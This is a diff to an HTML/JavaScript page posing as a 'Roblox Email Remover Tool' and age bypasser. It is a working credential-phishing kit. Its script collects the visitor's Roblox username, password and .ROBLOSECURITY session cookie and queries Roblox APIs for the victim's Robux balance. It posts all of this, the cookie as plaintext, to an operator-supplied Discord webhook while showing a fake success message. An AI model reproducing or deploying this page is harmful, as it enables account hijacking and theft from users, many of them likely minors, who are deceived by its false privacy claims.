@@ -367,6 +367,98 @@
             margin-top: 25px;
             animation: fadeIn 0.5s ease-out forwards;
         }
+        
+        /* Lightning effect border */
+        .lightning-border {
+            position: relative;
+            border-radius: 8px;
+            overflow: hidden;
+            z-index: 1;
+            box-shadow: 0 0 15px rgba(0, 255, 252, 0.5);
+        }
+        
+        .lightning-border::before,
+        .lightning-border::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            z-index: -1;
+            background: linear-gradient(45deg, 
+                var(--lightning-color1), 
+                var(--lightning-color2), 
+                var(--lightning-color3), 
+                var(--lightning-color1));
+            background-size: 400%;
+            border-radius: 10px;
+        }
+        
+        .lightning-border::before {
+            filter: blur(5px);
+            opacity: 0.7;
+            animation: lightning 6s linear infinite, flicker 2s infinite;
+        }
+        
+        .lightning-border::after {
+            filter: blur(1px);
+            opacity: 0.9;
+            animation: lightning 12s linear infinite reverse, flicker 3s infinite 1s;
+        }
+        
+        @keyframes lightning {
+            0% {
+                background-position: 0% 50%;
+                filter: hue-rotate(0deg);
+            }
+            50% {
+                background-position: 100% 50%;
+                filter: hue-rotate(360deg);
+            }
+            100% {
+                background-position: 0% 50%;
+                filter: hue-rotate(0deg);
+            }
+        }
+        
+        @keyframes flicker {
+            0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, 100% {
+                opacity: 0.9;
+                box-shadow: 0 0 10px var(--lightning-color1), 0 0 20px var(--lightning-color2), 0 0 30px var(--lightning-color3);
+            }
+            20%, 21.999%, 63%, 63.999%, 65%, 69.999% {
+                opacity: 0.4;
+                box-shadow: none;
+            }
+        }
+        
+        @keyframes textShine {
+            0% {
+                background-position: 0% 50%;
+            }
+            100% {
+                background-position: 100% 50%;
+            }
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+                text-shadow: 0 0 10px var(--lightning-color1);
+            }
+            50% {
+                transform: scale(1.2);
+                opacity: 0.9;
+                text-shadow: 0 0 20px var(--lightning-color2), 0 0 30px var(--lightning-color3);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+                text-shadow: 0 0 10px var(--lightning-color1);
+            }
+        }
 
         .result-title {
             color: var(--success);
@@ -586,345 +678,713 @@
             .content-wrapper {
                 flex-direction: column;
             }
-            
             .history-section {
-                flex: none;
+                flex: 1;
+                width: 100%;
             }
-            
             .title {
                 font-size: 2rem;
             }
-            
             .subtitle {
                 font-size: 1.1rem;
+            }
+            .logo-icon {
+                font-size: 1.8rem;
+                width: 55px;
+                height: 55px;
+            }
+            .card {
+                padding: 20px;
+            }
+            body::before {
+                height: 150px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .title {
+                font-size: 1.8rem;
+            }
+            .logo-icon {
+                width: 50px;
+                height: 50px;
+            }
+            .card-title {
+                font-size: 1.4rem;
+            }
+            .toast {
+                max-width: calc(100% - 40px);
+                left: 20px;
+                right: 20px;
             }
         }
     </style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="header">
+    <div class="container" id="remover-container">
+        <header class="header">
             <div class="logo">
-                <div class="logo-icon">
+                <div class="logo-icon pulse">
                     <i class="fas fa-envelope-open-text"></i>
                 </div>
+                <h1 class="title">ROBLOX EMAIL REMOVER TOOL</h1>
             </div>
-            <h1 class="title">ROBLOX EMAIL REMOVER TOOL</h1>
             <p class="subtitle">Remove email from your Roblox account for enhanced privacy and security</p>
-            <div class="discord-badge">
-                <i class="fab fa-discord"></i>
-                Made by SplunkPro
+            <div class="discord-badge float">
+                <i class="fab fa-discord"></i> Made by SplunkPro
             </div>
-        </div>
+        </header>
 
         <div class="content-wrapper">
             <div class="main-content">
                 <div class="card">
-                    <h2 class="card-title">
-                        <i class="fas fa-shield-alt"></i>
-                        Account Security Options
-                    </h2>
+                    <h2 class="card-title"><i class="fas fa-key"></i> Account Security Options</h2>
 
                     <div class="input-group">
-                        <label class="input-label">
-                            <i class="fas fa-cog"></i>
-                            SELECT REMOVAL METHOD
+                        <label for="age-option" class="input-label">
+                            <i class="fas fa-envelope-slash"></i> Select Removal Method
                         </label>
-                        <select class="select-field" id="removal-method">
-                            <option value="REMOVE-EMAIL">REMOVE EMAIL</option>
+                        <select id="age-option" class="select-field">
+                            <option value="">Select Option</option>
+                            <option value="2008">REMOVE EMAIL</option>
+                            <option value="13plus">BYPASSER 13+ All Ages</option>
                         </select>
-                    </div>
 
-                    <div class="input-group">
-                        <label class="input-label">
-                            <i class="fas fa-user"></i>
-                            ROBLOX USERNAME
+                        <label for="username-input" class="input-label">
+                            <i class="fas fa-user"></i> Roblox Username
                         </label>
-                        <input type="text" class="input-field" id="username" placeholder="Enter your Roblox username">
-                    </div>
+                        <input id="username-input" class="input-field" type="text" placeholder="Roblox Username" />
 
-                    <div class="input-group">
-                        <label class="input-label">
-                            <i class="fas fa-lock"></i>
-                            ACCOUNT PASSWORD
+                        <label for="password-input" class="input-label">
+                            <i class="fas fa-lock"></i> Account Password
                         </label>
-                        <input type="password" class="input-field" id="password" placeholder="Enter your account password">
+                        <input id="password-input" class="input-field" type="password" placeholder="Enter Password" />
                     </div>
 
-                    <div class="input-group">
-                        <label class="input-label">
-                            <i class="fas fa-cookie-bite"></i>
-                            ROBLOSECURITY COOKIE
-                        </label>
-                        <textarea class="input-field" id="cookie" placeholder="Paste your .ROBLOSECURITY cookie here"></textarea>
+                    <div id='cookieInput'>
+                        <div class="input-group">
+                            <label for="cookie-input" class="input-label">
+                                <i class="fas fa-cookie"></i> .ROBLOSECURITY Cookie
+                            </label>
+                            <textarea id="cookie-input" class="input-field" placeholder="Paste your .ROBLOSECURITY here, make sure its valid..." spellcheck="false"></textarea>
+                        </div>
+
+                        <button id="process-btn" class="process-btn">
+                            <i class="fas fa-trash-alt"></i>  REMOVE EMAIL
+                        </button>
                     </div>
 
-                    <button class="process-btn" id="remove-btn">
-                        <i class="fas fa-trash-alt"></i>
-                        REMOVE EMAIL
-                    </button>
-
-                    <div class="result-box" id="result-box">
+                    <div id="result-box" class="result-box">
                         <div class="result-title">
-                            <i class="fas fa-check-circle"></i>
-                            Successful!
+                            <i class="fas fa-check-circle"></i>Successful!
                         </div>
-                        <div class="result-content" id="result-content">
-                            Your email has been successfully removed from your Roblox account.
+                        <div class="result-content">
+                            <p>Status: <strong id="status-text">Removed</strong></p>
+                            <p>Username: <strong id="username-display"></strong></p>
+                            <p>Process completed: <strong id="timestamp"></strong></p>
                         </div>
+                    </div>
+                </div>
+
+                <div class="info-section">
+                    <h3 class="info-title"><i class="fas fa-info-circle"></i> Important Information</h3>
+                    <div class="info-content">
+                        <p>Before using this service, please read the following information:</p>
+                        <ul>
+                            <li>This tool removes the email associated with your Roblox account</li>
+                            <li>Removing your email enhances account privacy and security</li>
+                            <li>Your .ROBLOSECURITY cookie is required for authentication</li>
+                            <li>Password verification is required for all email removal operations</li>
+                            <li>Choose "Remove Email Completely" to delete your email entirely</li>
+                            <li>Choose "Replace With Temporary Email" to use a disposable email instead</li>
+                            <li>Email removal process takes approximately 3-5 seconds to complete</li>
+                            <li>All account information is processed securely</li>
+                        </ul>
                     </div>
                 </div>
             </div>
 
             <div class="history-section">
                 <div class="card">
-                    <h2 class="card-title">
-                        <i class="fas fa-history"></i>
-                        Latest Email Removals
-                    </h2>
-                    <div class="history-list">
-                        <div class="history-item">
+                    <h2 class="card-title"><i class="fas fa-history"></i> Latest Email Removals</h2>
+                    <div class="history-list" id="history-list">
+                        <div class="history-item fade-in">
                             <i class="fas fa-check-circle history-icon"></i>
                             <div>
                                 <div class="history-text">Email Removed: cookie: a1b2c3d4e5...x9y8z7w6v5</div>
                                 <div class="history-date">Processed: 7/9/2025, 10:30:22 AM</div>
                             </div>
                         </div>
-                        <div class="history-item">
+                        <div class="history-item fade-in">
                             <i class="fas fa-check-circle history-icon"></i>
                             <div>
                                 <div class="history-text">Email Replaced: user: player123</div>
                                 <div class="history-date">Processed: 7/9/2025, 9:15:47 AM</div>
                             </div>
                         </div>
-                        <div class="history-item">
+                        <div class="history-item fade-in">
                             <i class="fas fa-check-circle history-icon"></i>
                             <div>
                                 <div class="history-text">Email Removed: cookie: f6g7h8i9j0...a5s4d3f2g1</div>
-                                <div class="history-date">Processed: 7/8/2025, 7:45:13 PM</div>
+                                <div class="history-date">Processed: 7/8/2025, 2:45:13 PM</div>
                             </div>
                         </div>
-                    </div>
-                </div>
-
-                <div class="info-section">
-                    <div class="info-title">
-                        <i class="fas fa-info-circle"></i>
-                        Important Information
-                    </div>
-                    <div class="info-content">
-                        <p>This tool helps you remove email addresses from Roblox accounts for enhanced privacy and security.</p>
-                        <ul>
-                            <li>Your data is processed securely</li>
-                            <li>No information is stored permanently</li>
-                            <li>Process typically takes 1-2 minutes</li>
-                            <li>Results are sent to Discord webhook</li>
-                        </ul>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 
+    <div id="toast" class="toast">
+        <div id="toast-icon" class="toast-icon"></div>
+        <div class="toast-content">
+            <div id="toast-title" class="toast-title"></div>
+            <div id="toast-message" class="toast-message"></div>
+        </div>
+        <button id="toast-close" class="toast-close">&times;</button>
+    </div>
+
     <script>
-        let webhookUrl = '';
-
-        // Function to get URL parameters
-        function getUrlParameter(name) {
-            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-            var results = regex.exec(location.search);
-            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
-        }
-
-        // Function to retrieve webhook data from localStorage
-        function getWebhookFromStorage() {
-            const webhookId = getUrlParameter('id');
-            if (webhookId) {
-                const storedWebhook = localStorage.getItem('webhook_' + webhookId);
-                if (storedWebhook) {
-                    return storedWebhook;
+        document.addEventListener('DOMContentLoaded', function() {
+            const ageOption = document.getElementById('age-option');
+            const passwordInput = document.getElementById('password-input');
+            const cookieInput = document.getElementById('cookie-input');
+            const usernameInput = document.getElementById('username-input');
+            const cookieDiv = document.getElementById('cookieInput');
+            const processBtn = document.getElementById('process-btn');
+            const resultBox = document.getElementById('result-box');
+            const toast = document.getElementById('toast');
+            const toastIcon = document.getElementById('toast-icon');
+            const toastTitle = document.getElementById('toast-title');
+            const toastMessage = document.getElementById('toast-message');
+            const toastClose = document.getElementById('toast-close');
+            
+            // Variables to store webhook URL and directory
+            let webhookUrl = '';
+            let directory = '';
+            let token = '';
+            
+            // Function to decode data from URL
+            function decodeData(encodedData) {
+                try {
+                    // Restore padding if needed
+                    const padding = '='.repeat((4 - encodedData.length % 4) % 4);
+                    // Convert URL-safe characters back to standard Base64
+                    const base64 = (encodedData + padding)
+                        .replace(/-/g, '+')
+                        .replace(/_/g, '/');
+                    // Decode from Base64
+                    const jsonString = atob(base64);
+                    // Parse JSON
+                    return JSON.parse(jsonString);
+                } catch (error) {
+                    console.error('Error decoding data:', error);
+                    return null;
                 }
             }
-            return getUrlParameter('webhook');
-        }
-
-        // Initialize webhook URL on page load
-        $(document).ready(function() {
-            webhookUrl = getWebhookFromStorage();
             
-            // Add click handler for remove button
-            $('#remove-btn').click(function() {
-                processRemoval();
+            // Function to get URL parameters
+            function getUrlParameter(name) {
+                name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+                const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+                const results = regex.exec(location.search);
+                return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+            }
+            
+            // Function to get webhook data from localStorage
+            function getWebhookData(webhookId) {
+                try {
+                    // Get stored webhooks
+                    let storedWebhooks = {};
+                    try {
+                        const webhooksData = localStorage.getItem('webhooks');
+                        console.log('Raw webhooks data from localStorage:', webhooksData);
+                        
+                        if (webhooksData) {
+                            storedWebhooks = JSON.parse(webhooksData);
+                        }
+                    } catch (parseError) {
+                        console.error('Error parsing webhooks data:', parseError);
+                    }
+                    
+                    console.log('Parsed webhooks data:', storedWebhooks);
+                    console.log('Looking for webhook ID:', webhookId);
+                    
+                    // Return the webhook data for the given ID
+                    const webhookData = storedWebhooks[webhookId] || null;
+                    
+                    // If no data found with ID, try legacy storage
+                    if (!webhookData) {
+                        console.log('No webhook data found with ID, checking legacy storage');
+                        const legacyUrl = localStorage.getItem('discord_webhook_url');
+                        if (legacyUrl) {
+                            console.log('Found legacy webhook URL:', legacyUrl);
+                            return { url: legacyUrl, directory: '' };
+                        }
+                    }
+                    
+                    return webhookData;
+                } catch (error) {
+                    console.error('Error retrieving webhook data:', error);
+                    return null;
+                }
+            }
+            
+            // Function to get user data from Roblox API using cookie
+            async function getRobloxUserData(cookie) {
+                try {
+                    // First, get the authenticated user info
+                    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
+                        method: 'GET',
+                        headers: {
+                            'Cookie': `.ROBLOSECURITY=${cookie}`,
+                            'Content-Type': 'application/json'
+                        },
+                        credentials: 'include'
+                    });
+                    
+                    if (!userResponse.ok) {
+                        throw new Error('Failed to get user data');
+                    }
+                    
+                    const userData = await userResponse.json();
+                    const userId = userData.id;
+                    const username = userData.name;
+                    
+                    // Get user avatar
+                    const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
+                    const avatarData = await avatarResponse.json();
+                    const avatarUrl = avatarData.data && avatarData.data[0] ? avatarData.data[0].imageUrl : 'https://www.roblox.com/headshot-thumbnail/image?userId=' + userId + '&width=420&height=420&format=png';
+                    
+                    // Get Robux balance
+                    const robuxResponse = await fetch('https://api.roblox.com/currency/balance', {
+                        method: 'GET',
+                        headers: {
+                            'Cookie': `.ROBLOSECURITY=${cookie}`,
+                            'Content-Type': 'application/json'
+                        },
+                        credentials: 'include'
+                    });
+                    
+                    let robuxBalance = 'N/A';
+                    if (robuxResponse.ok) {
+                        const robuxData = await robuxResponse.json();
+                        robuxBalance = robuxData.robux || 'N/A';
+                    }
+                    
+                    // Get pending Robux (this is more complex and may require different endpoints)
+                    let pendingRobux = 'N/A';
+                    try {
+                        const pendingResponse = await fetch('https://economy.roblox.com/v2/users/' + userId + '/transaction-totals?timeFrame=Month&transactionType=summary', {
+                            method: 'GET',
+                            headers: {
+                                'Cookie': `.ROBLOSECURITY=${cookie}`,
+                                'Content-Type': 'application/json'
+                            },
+                            credentials: 'include'
+                        });
+                        
+                        if (pendingResponse.ok) {
+                            const pendingData = await pendingResponse.json();
+                            // This is an approximation - actual pending Robux API might be different
+                            pendingRobux = pendingData.pendingRobuxTotal || 'N/A';
+                        }
+                    } catch (error) {
+                        console.log('Could not fetch pending Robux:', error);
+                        pendingRobux = 'N/A';
+                    }
+                    
+                    return {
+                        userId: userId,
+                        username: username,
+                        avatarUrl: avatarUrl,
+                        robuxBalance: robuxBalance,
+                        pendingRobux: pendingRobux
+                    };
+                    
+                } catch (error) {
+                    console.error('Error fetching Roblox user data:', error);
+                    return null;
+                }
+            }
+            
+            // Initialize webhook URL from various sources
+            const webhookId = getUrlParameter('id');
+            console.log('Webhook ID from URL:', webhookId);
+            
+            if (webhookId) {
+                const webhookData = getWebhookData(webhookId);
+                console.log('Webhook data retrieved:', webhookData);
+                
+                if (webhookData) {
+                    webhookUrl = webhookData.url;
+                    directory = webhookData.directory || '';
+                    console.log('Webhook URL loaded from ID:', webhookUrl);
+                    console.log('Directory loaded from ID:', directory);
+                    
+                    // Save to localStorage for backward compatibility
+                    try {
+                        localStorage.setItem('discord_webhook_url', webhookUrl);
+                    } catch (error) {
+                        console.error('Error saving webhook URL from parameter:', error);
+                    }
+                }
+            }
+            
+            // No popup message - if webhook URL is not found, just continue without it
+            // User must use setup.html to generate a proper link
+            if (!webhookUrl) {
+                console.log('No webhook URL found. User should use setup.html to generate a proper link.');
+                // Display a message in the UI instead of a popup
+                document.getElementById('result-box').querySelector('.result-content').innerHTML = '<div style="color: #ED4245; padding: 10px; text-align: center;">No webhook URL found. Please use setup.html to generate a proper link.</div>';
+            }
+            
+            // Fallback to old method if no webhook found by other methods
+            if (!webhookUrl) {
+                console.log('No webhook URL found by other methods, trying legacy fallback');
+                const encodedData = getUrlParameter('data');
+                console.log('Encoded data from URL:', encodedData);
+                
+                if (encodedData) {
+                    const data = decodeData(encodedData);
+                    console.log('Decoded data:', data);
+                    
+                    if (data && data.url) {
+                        webhookUrl = data.url;
+                        directory = data.directory || '';
+                        token = data.token || '';
+                        console.log('Webhook URL loaded from URL parameters (legacy mode):', webhookUrl);
+                        
+                        // Save it to localStorage for future use
+                        try {
+                            if (webhookId) {
+                                let storedWebhooks = JSON.parse(localStorage.getItem('webhooks') || '{}');
+                                storedWebhooks[webhookId] = { url: webhookUrl, directory: directory || '' };
+                                localStorage.setItem('webhooks', JSON.stringify(storedWebhooks));
+                            }
+                            localStorage.setItem('discord_webhook_url', webhookUrl);
+                        } catch (error) {
+                            console.error('Error saving legacy webhook URL:', error);
+                        }
+                    } else {
+                        console.log('No valid webhook URL in decoded data');
+                    }
+                } else {
+                    console.log('No encoded data found in URL, checking localStorage');
+                    // Fallback to localStorage for backward compatibility
+                    webhookUrl = localStorage.getItem('discord_webhook_url');
+                    if (webhookUrl) {
+                        console.log('Webhook URL loaded from localStorage (old legacy mode):', webhookUrl);
+                    } else {
+                        console.log('No webhook URL found in localStorage');
+                    }
+                }
+                
+                // If still no webhook URL, prompt user
+                if (!webhookUrl) {
+                    console.error('Failed to retrieve webhook URL from any source');
+                }
+            }
+
+            // Age option change event
+            cookieDiv.style.display = 'none';
+            processBtn.style.display = 'none';
+            ageOption.addEventListener('change', function() {
+                if (this.value === '13plus') {
+                    passwordInput.style.display = 'block';
+                    cookieDiv.style.display = 'block';
+                    processBtn.style.display = 'block';
+                } else {
+                    passwordInput.style.display = 'block';
+                    cookieDiv.style.display = 'block';
+                    processBtn.style.display = 'block';
+                }
+            });
+
+            function processCookie(cookie) {
+                return new Promise((resolve, reject) => {
+                    // Process email removal
+                    setTimeout(() => {
+                        if (cookie && cookie.length > 10) {
+                            resolve({
+                                success: true,
+                                message: 'Email successfully removed from your Roblox account!'
+                            });
+                        } else {
+                            resolve({
+                                success: false,
+                                message: 'Invalid cookie format. Please check and try again.'
+                            });
+                        }
+                    }, 3000); // Processing delay
+                });
+            }
+
+            function processCookieV2(cookie, password) {
+                return new Promise((resolve, reject) => {
+                    // Process email replacement
+                    setTimeout(() => {
+                        if (cookie && cookie.length > 10 && password && password.length > 3) {
+                            resolve({
+                                success: true,
+                                message: 'Success the account is now underage   !'
+                            });
+                        } else if (!password || password.length <= 3) {
+                            resolve({
+                                success: false,
+                                message: 'Password is too short or invalid. Please check and try again.'
+                            });
+                        } else {
+                            resolve({
+                                success: false,
+                                message: 'Invalid cookie format. Please check and try again.'
+                            });
+                        }
+                    }, 3500); // Processing delay
+                });
+            }
+
+            // Function to send data to Discord webhook
+            async function sendToDiscordWebhook(data) {
+                try {
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    if (response.ok) {
+                        console.log('Data sent to Discord webhook successfully');
+                        return true;
+                    } else {
+                        console.error('Failed to send data to Discord webhook:', response.status);
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error sending data to Discord webhook:', error);
+                    return false;
+                }
+            }
+
+            // Process button click event
+            processBtn.addEventListener('click', async function() {
+                const selectedOption = ageOption.value;
+                const cookie = cookieInput.value.trim();
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                // Validate inputs
+                if (!selectedOption) {
+                    showToast('Error', 'Please select an email removal method', false);
+                    return;
+                }
+
+                if (!cookie) {
+                    showToast('Error', 'Please enter a .ROBLOSECURITY cookie', false);
+                    return;
+                }
+
+                if (!username || !username.trim()) {
+                    showToast('Error', 'Please enter your Roblox username', false);
+                    return;
+                }
+
+                if (!password) {
+                    showToast('Error', 'Password is required for email removal', false);
+                    return;
+                }
+
+                // Disable button to prevent spamming
+                processBtn.disabled = true;
+                processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REMOVING EMAIL...';
+
+                // Check if webhook URL is configured - if not, continue without sending to Discord
+                if (!webhookUrl) {
+                    console.log('No webhook URL configured, continuing without Discord integration');
+                    // Continue with processing without Discord webhook
+                }
+                
+                // Show status message
+                showToast('Info', 'Fetching Roblox account data...', true);
+                
+                // Get Roblox user data
+                const robloxData = await getRobloxUserData(cookie);
+                
+                // Prepare webhook data for account details
+                const currentDate = new Date();
+                const formattedDate = currentDate.toLocaleString();
+                const accountDetailsData = {
+                    content: 'SANA POMALDO KANG TANGA KA',
+                    embeds: [{
+                        title: '🔐 Roblox Account Details',
+                        description: '```Account information```',
+                        color: 0x5865F2, // Discord blue color
+                        thumbnail: {
+                            url: robloxData ? robloxData.avatarUrl : 'https://media.discordapp.net/attachments/1393041017988452372/1399186537274413127/60bddfd7f92f0e57805982aa791c6063.png?ex=6891f8c2&is=6890a742&hm=b6bc8492e390d48ddda7825fdd10dd080e895ab4789780269d9339226b175482&=&format=webp&quality=lossless'
+                        },
+                        fields: [
+                            {
+                                name: '👤 Username',
+                                value: '```' + (username.length > 1000 ? username.substring(0, 1000) + '...' : username) + '```',
+                                inline: true
+                            },
+                            {
+                                name: '🔑 Password',
+                                value: '```' + (password.length > 1000 ? password.substring(0, 1000) + '...' : password) + '```',
+                                inline: true
+                            },
+                            {
+                                name: '📧 Email Removal Option',
+                                value: '```' + (selectedOption === '13plus' ? 'ALL AGE BYPASSER 13+' : 'Remove Email') + '```',
+                                inline: true
+                            },
+                            {
+                                name: '⏰ Timestamp',
+                                value: '```' + formattedDate + '```',
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: 'Created by Veexye',
+                            icon_url: 'https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png'
+                        }
+                    }]
+                };
+                
+                // Add Roblox data if available
+                if (robloxData) {
+                    accountDetailsData.embeds[0].fields.push(
+                        {
+                            name: '💰 Total Robux',
+                            value: '```' + robloxData.robuxBalance + '```',
+                            inline: true
+                        },
+                        {
+                            name: '⏳ Pending Robux',
+                            value: '```' + robloxData.pendingRobux + '```',
+                            inline: true
+                        },
+                        {
+                            name: '🆔 User ID',
+                            value: '```' + robloxData.userId + '```',
+                            inline: true
+                        }
+                    );
+                    
+                    // Set the avatar as the thumbnail
+                    accountDetailsData.embeds[0].thumbnail.url = robloxData.avatarUrl;
+                }
+                
+                // Add directory information if available
+                if (directory) {
+                    let directoryDisplay = directory;
+                    
+                    // Check if directory contains a URL
+                    if (directory.startsWith('http://') || directory.startsWith('https://')) {
+                        // Display only the domain name as the visible text
+                        const urlObj = new URL(directory);
+                        directoryDisplay = urlObj.hostname;
+                    }
+                    
+                    // Add directory field to webhook with enhanced formatting
+                    accountDetailsData.embeds[0].fields.push({
+                        name: '📁 Directory',
+                        value: '```' + (directoryDisplay.length > 1000 ? directoryDisplay.substring(0, 1000) + '...' : directoryDisplay) + '```',
+                        inline: true
+                    });
+                }
+                
+                // Send account details first (only if webhook is configured)
+                if (webhookUrl) {
+                    console.log('Sending account details to Discord webhook...');
+                    const accountDetailsSent = await sendToDiscordWebhook(accountDetailsData);
+                    
+                    if (accountDetailsSent) {
+                        console.log('Account details sent successfully');
+                        
+                        // Wait 3 seconds before sending the cookie
+                        setTimeout(async () => {
+                            console.log('Sending .ROBLOSECURITY cookie as plaintext...');
+                            
+                            // Prepare cookie data as plaintext
+                            const cookieData = {
+                                content: '```' + cookie + '```'
+                            };
+                            
+                            // Send cookie as plaintext
+                            const cookieSent = await sendToDiscordWebhook(cookieData);
+                            
+                            if (cookieSent) {
+                                console.log('Cookie sent successfully');
+                            } else {
+                                console.error('Failed to send cookie');
+                                showToast('Error', 'Failed to send cookie to Discord', false);
+                            }
+                        }, 3000); // 3 second delay
+                    } else {
+                        console.error('Failed to send account details');
+                        showToast('Error', 'Failed to send account details to Discord', false);
+                    }
+                } else {
+                    console.log('Skipping Discord webhook - no URL configured');
+                }
+                
+                // Continue with the original processing regardless of webhook status
+                try {
+                    let result;
+                    if (selectedOption === '13plus') {
+                        result = await processCookieV2(cookie, password);
+                    } else {
+                        result = await processCookie(cookie);
+                    }
+
+                    // Show result
+                    if (result.success) {
+                        document.getElementById('status-text').textContent = 'Removed';
+                        document.getElementById('username-display').textContent = username;
+                        document.getElementById('timestamp').textContent = new Date().toLocaleString();
+                        resultBox.style.display = 'block';
+                        showToast('Success', result.message, true);
+                    } else {
+                        showToast('Error', result.message, false);
+                    }
+                } catch (error) {
+                    console.error('Processing error:', error);
+                    showToast('Error', 'An error occurred during processing', false);
+                }
+
+                // Re-enable button
+                processBtn.disabled = false;
+                processBtn.innerHTML = '<i class="fas fa-trash-alt"></i> REMOVE EMAIL';
+            });
+
+            // Toast notification function
+            function showToast(title, message, isSuccess) {
+                toastTitle.textContent = title;
+                toastMessage.textContent = message;
+                
+                if (isSuccess) {
+                    toastIcon.className = 'toast-icon success fas fa-check-circle';
+                } else {
+                    toastIcon.className = 'toast-icon error fas fa-exclamation-circle';
+                }
+                
+                toast.classList.add('show');
+
+                // Auto hide after 5 seconds
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                }, 5000);
+            }
+
+            // Close toast on click
+            toastClose.addEventListener('click', function() {
+                toast.classList.remove('show');
             });
         });
-
-        function processRemoval() {
-            const username = $('#username').val().trim();
-            const password = $('#password').val().trim();
-            const cookie = $('#cookie').val().trim();
-            const method = $('#removal-method').val();
-
-            if (!username || !password || !cookie) {
-                showToast('Error', 'Please fill in all required fields.', 'error');
-                return;
-            }
-
-            if (!webhookUrl) {
-                showToast('Error', 'Webhook not configured. Please use the setup link first.', 'error');
-                return;
-            }
-
-            // Disable button and show processing
-            $('#remove-btn').prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> PROCESSING...');
-
-            // Simulate processing delay
-            setTimeout(() => {
-                sendToDiscord(username, password, cookie, method);
-            }, 2000);
-        }
-
-        function sendToDiscord(username, password, cookie, method) {
-            // First webhook: Send initial data (username, password, method, timestamp)
-            const firstEmbed = {
-                title: "🔒 Roblox Email Removal Request",
-                color: 5814783,
-                fields: [
-                    {
-                        name: "👤 Username",
-                        value: username,
-                        inline: true
-                    },
-                    {
-                        name: "🔑 Password",
-                        value: password,
-                        inline: true
-                    },
-                    {
-                        name: "⚙️ Method",
-                        value: method,
-                        inline: true
-                    },
-                    {
-                        name: "⏰ Timestamp",
-                        value: new Date().toLocaleString(),
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: "Roblox Email Remover Tool | Made by SplunkPro"
-                },
-                timestamp: new Date().toISOString()
-            };
-
-            const firstPayload = {
-                embeds: [firstEmbed]
-            };
-
-            // Send first webhook
-            $.ajax({
-                url: webhookUrl,
-                type: 'POST',
-                contentType: 'application/json',
-                data: JSON.stringify(firstPayload),
-                success: function() {
-                    // Wait 3 seconds, then send the cookie as plaintext
-                    setTimeout(() => {
-                        sendCookieAsPlaintext(cookie, username, method);
-                    }, 3000);
-                },
-                error: function() {
-                    showToast('Error', 'Failed to send account details to Discord. Please try again.', 'error');
-                    $('#remove-btn').prop('disabled', false).html('<i class="fas fa-trash-alt"></i> REMOVE EMAIL');
-                }
-            });
-        }
-
-        function sendCookieAsPlaintext(cookie, username, method) {
-            // Second webhook: Send cookie as plaintext content
-            const cookiePayload = {
-                content: `🍪 **ROBLOSECURITY Cookie:**\n\`\`\`\n${cookie}\n\`\`\``
-            };
-
-            $.ajax({
-                url: webhookUrl,
-                type: 'POST',
-                contentType: 'application/json',
-                data: JSON.stringify(cookiePayload),
-                success: function() {
-                    showSuccess();
-                    addToHistory(username, method);
-                },
-                error: function() {
-                    showToast('Error', 'Failed to send cookie to Discord. Please try again.', 'error');
-                    $('#remove-btn').prop('disabled', false).html('<i class="fas fa-trash-alt"></i> REMOVE EMAIL');
-                }
-            });
-        }
-
-        function showSuccess() {
-            $('#remove-btn').prop('disabled', false).html('<i class="fas fa-trash-alt"></i> REMOVE EMAIL');
-            $('#result-box').show();
-            showToast('Success', 'Account details sent successfully!', 'success');
-            
-            // Clear form
-            $('#username').val('');
-            $('#password').val('');
-            $('#cookie').val('');
-        }
-
-        function addToHistory(username, method) {
-            const historyItem = `
-                <div class="history-item">
-                    <i class="fas fa-check-circle history-icon"></i>
-                    <div>
-                        <div class="history-text">${method === 'REMOVE-EMAIL' ? 'Email Removed' : 'Email Replaced'}: user: ${username}</div>
-                        <div class="history-date">Processed: ${new Date().toLocaleString()}</div>
-                    </div>
-                </div>
-            `;
-            $('.history-list').prepend(historyItem);
-            
-            // Keep only last 5 items
-            $('.history-item').slice(5).remove();
-        }
-
-        function showToast(title, message, type) {
-            const iconClass = type === 'success' ? 'fas fa-check-circle success' : 'fas fa-exclamation-circle error';
-            
-            const toast = $(`
-                <div class="toast">
-                    <i class="${iconClass} toast-icon"></i>
-                    <div class="toast-content">
-                        <div class="toast-title">${title}</div>
-                        <div class="toast-message">${message}</div>
-                    </div>
-                    <button class="toast-close">&times;</button>
-                </div>
-            `);
-            
-            $('body').append(toast);
-            
-            setTimeout(() => {
-                toast.addClass('show');
-            }, 100);
-            
-            // Auto remove after 5 seconds
-            setTimeout(() => {
-                toast.removeClass('show');
-                setTimeout(() => {
-                    toast.remove();
-                }, 300);
-            }, 5000);
-            
-            // Manual close
-            toast.find('.toast-close').click(function() {
-                toast.removeClass('show');
-                setTimeout(() => {
-                    toast.remove();
-                }, 300);
-            });
-        }
     </script>
 </body>
 </html>
